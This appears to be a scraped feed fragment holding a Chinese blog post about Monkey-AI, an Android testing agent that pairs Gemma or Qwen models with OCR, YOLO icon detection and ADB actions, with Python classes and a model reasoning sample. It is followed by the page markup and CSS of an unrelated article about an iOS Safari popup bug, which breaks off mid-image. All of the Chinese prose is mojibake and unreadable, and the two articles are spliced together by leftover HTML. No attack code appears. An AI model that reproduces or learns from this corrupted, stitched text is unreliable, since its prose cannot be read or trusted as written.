<p>å®ƒå°±åƒä¸€åª<code>èªæ˜</code>ä¸”<code>ä¸çŸ¥ç–²å€¦</code>çš„â€œçŒ´å­â€ï¼Œä½†è¿™åªçŒ´å­è£…ä¸Šäº†â€œå¤§è„‘â€å’Œâ€œçœ¼ç›â€ï¼š</p>
<ul>
<li><strong>å¤§è„‘</strong>ï¼šç”± Gemma æˆ– Qwen æ¨¡å‹é©±åŠ¨ï¼Œè´Ÿè´£ç†è§£æŒ‡ä»¤å’Œè§„åˆ’åŠ¨ä½œã€‚</li>
<li><strong>çœ¼ç›</strong>ï¼šç»“åˆäº† OCR å’Œå›¾æ ‡æ£€æµ‹æŠ€æœ¯ï¼Œèƒ½å¤Ÿç²¾å‡†è¯†åˆ«å±å¹•ä¸Šçš„æ–‡å­—å’Œå›¾æ ‡ã€‚</li>
<li><strong>æ‰‹è„š</strong>ï¼šé€šè¿‡ ADB æŒ‡ä»¤æ‰§è¡Œç‚¹å‡»ã€æ»‘åŠ¨ã€è¾“å…¥ç­‰æ“ä½œã€‚</li>
</ul>
<h2 data-id="heading-1">æ ¸å¿ƒåŠ¨åŠ›ï¼šGemma ä¸ Qwen å®¶æ—</h2>
<p>æœ¬é¡¹ç›®ç›®å‰æ”¯æŒä¸¤å¤§ä¸»æµå¼€æºæ¨¡å‹å®¶æ—ï¼Œå®ƒä»¬å„æœ‰æ‰€é•¿ï¼š</p>
<h3 data-id="heading-2">1. Gemma (Google)</h3>
<p>Gemma æ˜¯ Google åŸºäº Gemini æŠ€æœ¯æ„å»ºçš„è½»é‡çº§å¼€æ”¾æ¨¡å‹ã€‚</p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šä½“ç§¯å°ï¼ˆå¦‚ 2B/7B ç‰ˆæœ¬ï¼‰ï¼ŒæŒ‡ä»¤éµå¾ªèƒ½åŠ›å¼ºï¼Œé€»è¾‘æ¨ç†å‡ºè‰²ã€‚å°¤å…¶æ˜¯ 270M å‚æ•°è§„æ¨¡çš„ FunctionGemmaï¼Œåœ¨ Function Calling æ–¹é¢çš„è¡¨ç°éå¸¸å‡ºè‰²ï¼Œä½“ç§¯ä»…å‡ ç™¾å…†ã€‚</li>
<li><strong>åœ¨æœ¬é¡¹ç›®ä¸­çš„åº”ç”¨</strong>ï¼šGemma ä¸»è¦ä½œä¸º <strong>Text Brainï¼ˆæ–‡æœ¬å¤§è„‘ï¼‰</strong>ã€‚æˆ‘ä»¬å°†å±å¹•ä¸Šçš„ UI å…ƒç´ è½¬åŒ–ä¸ºç»“æ„åŒ–çš„æ–‡æœ¬æè¿°å–‚ç»™ Gemmaï¼Œå®ƒèƒ½å¿«é€Ÿåˆ†æå‡ºâ€œè¦ç‚¹å‡»å“ªä¸ªæŒ‰é’®â€æˆ–â€œè¦è¾“å…¥ä»€ä¹ˆå†…å®¹â€ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abe8459a1c6745529e686bec604583c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5rab55qE6Ieq5Lmg5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770781733&amp;x-signature=FZZc1mSeX8xu0mgRSoB1DSoAa%2FY%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">2. Qwen-VL (é˜¿é‡Œ)</h3>
<p>Qwen (é€šä¹‰åƒé—®) å®¶æ—çš„ Vision-Language (VL) ç‰ˆæœ¬ï¼Œæ‹¥æœ‰å¼ºå¤§çš„è§†è§‰ç†è§£èƒ½åŠ›ã€‚</p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šä¸ä»…èƒ½â€œè¯»â€å­—ï¼Œè¿˜èƒ½ç›´æ¥â€œçœ‹â€å›¾ã€‚å®ƒèƒ½ç†è§£å±å¹•æˆªå›¾ä¸­çš„å¤æ‚å¸ƒå±€å’Œå›¾æ ‡å«ä¹‰ã€‚</li>
<li><strong>åœ¨æœ¬é¡¹ç›®ä¸­çš„åº”ç”¨</strong>ï¼šä½œä¸º <strong>Vision Brainï¼ˆè§†è§‰å¤§è„‘ï¼‰</strong>ã€‚ç›´æ¥å°†æ‰‹æœºæˆªå›¾å–‚ç»™æ¨¡å‹ï¼Œè®©å®ƒåƒäººç±»ä¸€æ ·åŸºäºè§†è§‰ä¿¡æ¯é€šè¿‡åæ ‡è¿›è¡Œå†³ç­–ï¼Œé€šè¿‡è§†è§‰ç†è§£èƒ½åŠ›å¼¥è¡¥çº¯æ–‡æœ¬æè¿°çš„ä¸è¶³ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b277be68dc4e4906b5ce18c7d11171a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5rab55qE6Ieq5Lmg5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770781733&amp;x-signature=cPYxDpomoZVwHBad98QYW725m7s%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">æ¶æ„æ­ç§˜ï¼šMonkey-AI æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</h2>
<p><code>Monkey-AI</code> çš„å®ç°é€»è¾‘å¹¶ä¸å¤æ‚ï¼Œæ ¸å¿ƒæ˜¯ä¸€ä¸ª<strong>æ„ŸçŸ¥-å†³ç­–-æ‰§è¡Œ</strong>çš„é—­ç¯ç³»ç»Ÿã€‚ä¸‹é¢æ˜¯å®ƒçš„æ¶æ„æµç¨‹å›¾ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d28b52b453748d3ad7dc65fc9fecc27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5rab55qE6Ieq5Lmg5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770781733&amp;x-signature=hbYhTHQB%2Btmqh0gbucAybFwJ95Y%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">1. æ„ŸçŸ¥å±‚ (Perception Engine)</h3>
<p>è¿™æ˜¯ Agent çš„â€œçœ¼ç›â€ã€‚å•çº¯çš„å¤§æ¨¡å‹è™½ç„¶å¼ºå¤§ï¼Œä½†ç›´æ¥å¤„ç†é«˜åˆ†è¾¨ç‡æˆªå›¾é€Ÿåº¦è¾ƒæ…¢ä¸”ç²¾åº¦æœ‰é™ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¼•å…¥äº†ä¼ ç»Ÿçš„è®¡ç®—æœºè§†è§‰æŠ€æœ¯ä½œä¸ºè¾…åŠ©ï¼š</p>
<ul>
<li><strong>OCR</strong>ï¼šå¿«é€Ÿæå–å±å¹•ä¸Šçš„æ‰€æœ‰æ–‡å­—ä¿¡æ¯ã€‚</li>
<li><strong>Icon æ£€æµ‹ (YOLO)</strong>ï¼šä¸“é—¨è®­ç»ƒçš„æ¨¡å‹ï¼Œç”¨äºè¯†åˆ«â€œè¿”å›â€ã€â€œè®¾ç½®â€ã€â€œWiFiâ€ç­‰å¸¸è§å›¾æ ‡ã€‚</li>
<li><strong>èåˆ (Fusion)</strong>ï¼šå°†æ–‡å­—å’Œå›¾æ ‡ä½ç½®åˆå¹¶ï¼Œç”Ÿæˆä¸€ä»½åŒ…å«åæ ‡å’Œç±»å‹çš„ <code>ClickableElement</code> åˆ—è¡¨ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aec0f9d025f9406b962cfff413972604~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyx5rab55qE6Ieq5Lmg5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770781733&amp;x-signature=68hkRcK0IPpKvJCEku1L%2F1w4hdg%3D" alt="image.png" loading="lazy"/></p>
<p>å…¶å®ï¼ŒOCR å’Œ YOLO é¢„å¤„ç†è¿™ä¸ªæ­¥éª¤ï¼Œå¯¹äºé¡¶å°–çš„ LLM æ˜¯å¯ä»¥çœç•¥çš„ï¼Œåƒ Gemini 3ã€GPT5ï¼Œå®ƒä»¬éƒ½èƒ½å¤Ÿç›´æ¥é€šè¿‡æˆªå›¾ç»™å‡ºå…·ä½“è¡Œä¸ºçš„åæ ‡ã€‚ä½†æˆ‘ä»¬è¿™ä¸æ˜¯ä¸ºäº†çœé’±ï¼Œæƒ³ç”¨è‡ªå·±çš„ç”µè„‘æ¥è·‘å˜›ï¼Œæ‰€ä»¥ï¼Œè¿™ä¸ªé¢„å¤„ç†æ­¥éª¤å°±æ˜¾å¾—å¾ˆé‡è¦äº†ã€‚</p>
<p>æå‰æ ‡è®°å¥½æ‰€æœ‰çš„æ–‡æœ¬ã€iconï¼Œç»™å®ƒä»¬ç¼–å·ï¼ŒLLM åœ¨å†³ç­–çš„æ—¶å€™èƒ½å¤Ÿè·³è¿‡åæ ‡è®¡ç®—ï¼Œç›´æ¥æ¨ç†ä¸‹ä¸€æ­¥å…·ä½“çš„è¡Œä¸ºã€‚è¿™ä¸ªæ­¥éª¤å¯ä»¥å¤§å¹…æå‡å°æ¨¡å‹çš„è¡Œä¸ºå‡†ç¡®åº¦ã€‚</p>
<h3 data-id="heading-6">2. å†³ç­–å±‚ (Brain)</h3>
<p>è¿™æ˜¯ Agent çš„â€œå¤§è„‘â€ã€‚</p>
<ul>
<li><strong>Text Brain</strong>ï¼šæ¥æ”¶ç”¨æˆ·ç›®æ ‡ï¼ˆGoalï¼‰å’Œæ„ŸçŸ¥å±‚æä¾›çš„ UI å…ƒç´ åˆ—è¡¨ã€‚å®ƒä¸éœ€è¦çœ‹å›¾ï¼Œåªéœ€åˆ†ææ–‡æœ¬ï¼šâ€œç›®æ ‡æ˜¯æ‰“å¼€ WiFiï¼Œç°åœ¨å±å¹•ä¸Šæœ‰â€˜è®¾ç½®â€™å›¾æ ‡ï¼Œæ‰€ä»¥æˆ‘åº”è¯¥ç‚¹å‡»â€˜è®¾ç½®â€™ã€‚â€</li>
<li><strong>Vision Brain</strong>ï¼šåœ¨æ–‡æœ¬ä¿¡æ¯ä¸è¶³æ—¶ï¼Œç›´æ¥è§‚å¯Ÿæˆªå›¾ã€‚ä¾‹å¦‚ï¼Œæœ‰äº›æŒ‰é’®åªæœ‰å¤æ‚çš„å›¾å½¢æ²¡æœ‰æ–‡å­—ï¼Œè§†è§‰æ¨¡å‹èƒ½æ›´å¥½åœ°ç†è§£å…¶å«ä¹‰ã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python">// Brain å±‚æŠ½è±¡
<span class="hljs-meta">@dataclass(<span class="hljs-params">frozen=<span class="hljs-literal">True</span></span>)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ScreenState</span>:
    elements: <span class="hljs-built_in">list</span>[ClickableElement]
    screen_size: <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>]
    package: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>
    image_bgr: <span class="hljs-string">"np.ndarray | None"</span> = <span class="hljs-literal">None</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">Brain</span>(<span class="hljs-title class_ inherited__">ABC</span>):
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next_action</span>(<span class="hljs-params">self, screen: ScreenState</span>) -&gt; Action:
        <span class="hljs-keyword">raise</span> NotImplementedError

</code></pre>
<p>å¯¹äºç«¯ä¾§çš„ AI æ¨¡å‹ï¼Œæ˜¯å¦å¼€å¯ Thinkï¼Œæ•ˆæœå·®å¼‚ä¼šå¾ˆå¤§ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">ç”¨æˆ·ç°åœ¨éœ€è¦å®Œæˆçš„ä»»åŠ¡æ˜¯ï¼šæ‰“å¼€è®¾ç½®é¡µé¢ï¼Œè¿›å…¥é€šçŸ¥æ ï¼Œå»åº”ç”¨è®¾ç½®é‡Œï¼Œå…³é—­Chromeçš„é€šçŸ¥æƒé™ã€‚é¦–å…ˆçœ‹å†å²åŠ¨ä½œå·²ç»ç‚¹å‡»äº†è®¾ç½®å›¾æ ‡ï¼Œæ‰€ä»¥å½“å‰åœ¨è®¾ç½®ä¸»ç•Œé¢ã€‚

æ¥ä¸‹æ¥è¦è¿›å…¥é€šçŸ¥ç›¸å…³éƒ¨åˆ†ã€‚æ ¹æ®å…ƒç´ åˆ—è¡¨ï¼Œ<span class="hljs-number">27</span>å¯¹åº”çš„æ˜¯â€œé€šçŸ¥â€ï¼Œæ–‡æœ¬æ˜¯â€œé€šçŸ¥â€ï¼Œä½ç½®åœ¨å±å¹•ä¸­ä¸‹éƒ¨ã€‚æ‰€ä»¥éœ€è¦ç‚¹å‡»â€œé€šçŸ¥â€é€‰é¡¹æ¥è¿›å…¥é€šçŸ¥è®¾ç½®é¡µé¢ã€‚

æ£€æŸ¥å¯ç‚¹å‡»å…ƒç´ åˆ—è¡¨ï¼Œç¬¬<span class="hljs-number">27</span>ä¸ªå…ƒç´ æ˜¯text é€šçŸ¥ (<span class="hljs-number">226</span>, <span class="hljs-number">1955</span>, <span class="hljs-number">414</span>, <span class="hljs-number">2029</span>)ï¼Œå¯¹åº”çš„å°±æ˜¯é€šçŸ¥å…¥å£ã€‚å› æ­¤ä¸‹ä¸€æ­¥æ“ä½œåº”è¯¥æ˜¯ç‚¹å‡»è¿™ä¸ªâ€œé€šçŸ¥â€é€‰é¡¹ã€‚
&lt;/think&gt;

</code></pre>
<h3 data-id="heading-7">3. æ‰§è¡Œå±‚ (Action Executor)</h3>
<p>è¿™æ˜¯ Agent çš„â€œæ‰‹â€ã€‚
å¤§è„‘è¾“å‡ºçš„å†³ç­–é€šå¸¸æ˜¯æŠ½è±¡çš„ï¼ˆä¾‹å¦‚ï¼šâ€œç‚¹å‡» ID ä¸º 5 çš„å…ƒç´ â€ï¼‰ã€‚æ‰§è¡Œå±‚è´Ÿè´£å°†è¿™äº›æŒ‡ä»¤ç¿»è¯‘æˆå…·ä½“çš„ Android åæ ‡ï¼Œé€šè¿‡ ADB å‘é€ <code>input tap</code> æˆ– <code>input swipe</code> å‘½ä»¤ï¼Œç”šè‡³å¤„ç†åæ ‡æ˜ å°„ï¼ˆä»æˆªå›¾åæ ‡ç³»åˆ°è®¾å¤‡åæ ‡ç³»ï¼‰ã€‚</p>
<p>è¿™ä¸ªéƒ¨åˆ†åè€Œæ˜¯æœ€ç®€å•çš„ï¼Œä½œä¸º Android ç¨‹åºå‘˜ï¼Œè°è¿˜ä¸ä¼šç‚¹ adb å‘½ä»¤äº†ï¼Ÿ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AndroidDevice</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, device: u2.Device</span>) -&gt; <span class="hljs-literal">None</span>:
        self._device = device

<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params">cls, serial: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-string">"AndroidDevice"</span>:
        device = u2.connect(serial) <span class="hljs-keyword">if</span> serial <span class="hljs-keyword">else</span> u2.connect()
        <span class="hljs-keyword">return</span> cls(device)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>) -&gt; DeviceInfo:
        info = self._device.info
        width = <span class="hljs-built_in">int</span>(info.get(<span class="hljs-string">"displayWidth"</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
        height = <span class="hljs-built_in">int</span>(info.get(<span class="hljs-string">"displayHeight"</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
        serial = info.get(<span class="hljs-string">"serial"</span>)
        <span class="hljs-keyword">return</span> DeviceInfo(width=width, height=height, serial=serial)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">screenshot_bgr</span>(<span class="hljs-params">self</span>) -&gt; np.ndarray:
        image = self._device.screenshot(<span class="hljs-built_in">format</span>=<span class="hljs-string">"opencv"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(image, np.ndarray):
            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"screenshot not returned as ndarray"</span>)
        <span class="hljs-keyword">return</span> image

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">click</span>(<span class="hljs-params">self, x: <span class="hljs-built_in">int</span>, y: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
        self._device.click(x, y)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">swipe</span>(<span class="hljs-params">self, start: <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>], end: <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>], duration: <span class="hljs-built_in">float</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">if</span> duration <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            self._device.swipe(start[<span class="hljs-number">0</span>], start[<span class="hljs-number">1</span>], end[<span class="hljs-number">0</span>], end[<span class="hljs-number">1</span>])
        <span class="hljs-keyword">else</span>:
            self._device.swipe(start[<span class="hljs-number">0</span>], start[<span class="hljs-number">1</span>], end[<span class="hljs-number">0</span>], end[<span class="hljs-number">1</span>], duration)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">press</span>(<span class="hljs-params">self, key: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:
        self._device.press(key)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">input_text</span>(<span class="hljs-params">self, text: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:
        payload = text.replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"%s"</span>)
        self._device.adb_shell(<span class="hljs-string">"input"</span>, <span class="hljs-string">"text"</span>, payload)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">app_start</span>(<span class="hljs-params">self, package: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:
        self._device.app_start(package, wait=<span class="hljs-literal">True</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">app_current</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]:
        <span class="hljs-keyword">return</span> self._device.app_current()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">window_size</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>]:
        size = self._device.window_size()
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(size[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(size[<span class="hljs-number">1</span>])
</code></pre>
<h2 data-id="heading-8">æ€»ç»“ä¸å±•æœ›</h2>
<p><code>Monkey-AI</code> ç›®å‰è¿˜æ˜¯ä¸€ä¸ª <strong>Lite</strong> ç‰ˆæœ¬ï¼Œä½†å®ƒå±•ç¤ºäº†<strong>ç«¯ä¾§ AI + è‡ªåŠ¨åŒ–æµ‹è¯•</strong>çš„å·¨å¤§æ½œåŠ›ï¼š</p>
<ol>
<li><strong>éšç§å®‰å…¨</strong>ï¼šæ•°æ®ä¸å‡ºæœ¬åœ°ï¼Œé€‚åˆä¼ä¸šå†…éƒ¨æ•æ„Ÿåº”ç”¨çš„æµ‹è¯•ã€‚</li>
<li><strong>ä½æˆæœ¬</strong>ï¼šæ— éœ€æ”¯ä»˜æ˜‚è´µçš„ Token è´¹ç”¨ï¼Œä¸”æ¶ˆè´¹çº§çš„æ˜¾å¡æˆ–è€… 16G RAM çš„ Mac Mini å³å¯è¿è¡Œã€‚</li>
<li><strong>æ— é™å¯èƒ½</strong>ï¼šéšç€æ¨¡å‹èƒ½åŠ›çš„æå‡ï¼Œæœªæ¥çš„ Agent ä¸ä»…èƒ½è·‘å†’çƒŸæµ‹è¯•ï¼Œç”šè‡³èƒ½è¿›è¡Œæ¢ç´¢æ€§æµ‹è¯•ï¼Œå‘ç°äººç±»éš¾ä»¥å¯Ÿè§‰çš„ Bugã€‚</li>
</ol>
<p>è™½ç„¶ç°é˜¶æ®µè·‘åœ¨PCç”µè„‘ä¸Šçš„ Monkey-AI å¶å°”è¿˜ä¼šâ€œçŠ¯å‚»â€ï¼Œæ“ä½œé€Ÿåº¦ä¹Ÿæ¯”ä¸ä¸Šæ‰‹å†™è„šæœ¬ï¼Œä½†å®ƒä»£è¡¨äº†æœªæ¥çš„æ–¹å‘ã€‚Android å¼€å‘è€…ä»¬ï¼Œæ˜¯æ—¶å€™æ‹¥æŠ± AIï¼Œè®©æˆ‘ä»¬çš„æµ‹è¯•å·¥ä½œå˜å¾—æ›´é…·ã€æ›´æ™ºèƒ½äº†ï¼</p>
<p>ç›®å‰ Monkey-AI è¿˜åœ¨å†…éƒ¨æµ‹è¯•é˜¶æ®µï¼Œæ¬¢è¿æ„Ÿå…´è¶£çš„æœ‹å‹å…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<code>æœ±æ¶›çš„è‡ªä¹ å®¤</code>ï¼Œå‚ä¸æµ‹è¯•ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¸©å‘è®°å½•ï¼šiOS Safari è½¯é”®ç›˜ä¸‹çš„"å¹½çµå¼¹çª—"é—®é¢˜]]></title>    <link>https://juejin.cn/post/7602466689713340431</link>    <guid>https://juejin.cn/post/7602466689713340431</guid>    <pubDate>2026-02-04T04:59:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602466689713340431" data-draft-id="7602488187408580660" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è¸©å‘è®°å½•ï¼šiOS Safari è½¯é”®ç›˜ä¸‹çš„&quot;å¹½çµå¼¹çª—&quot;é—®é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2026-02-04T04:59:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RemHusband"/> <meta itemprop="url" content="https://juejin.cn/user/1425415102792237"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è¸©å‘è®°å½•ï¼šiOS Safari è½¯é”®ç›˜ä¸‹çš„"å¹½çµå¼¹çª—"é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1425415102792237/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RemHusband
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T04:59:03.000Z" title="Wed Feb 04 2026 04:59:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOzH4KBJQTrK8M7+7KZjuM63sHBt17FubGoibCuf+tarWFGUmuwWeT8/vCXo1tZOYeZcazCaez8MwEzzM+HqhqtiJI5twxL1jeGLYk7jmKMF1JOCbg6Qj5nAdRqX7q3BYm8VAmQvW1lfcMc58IT95uIA3q+gftrDHPXUXJWkVEHJme5Bp5UmHsvIZ/O3l8ECE/FWcsItX2hr0ae8O2Wjs+J43QTbOZzGYQ/7W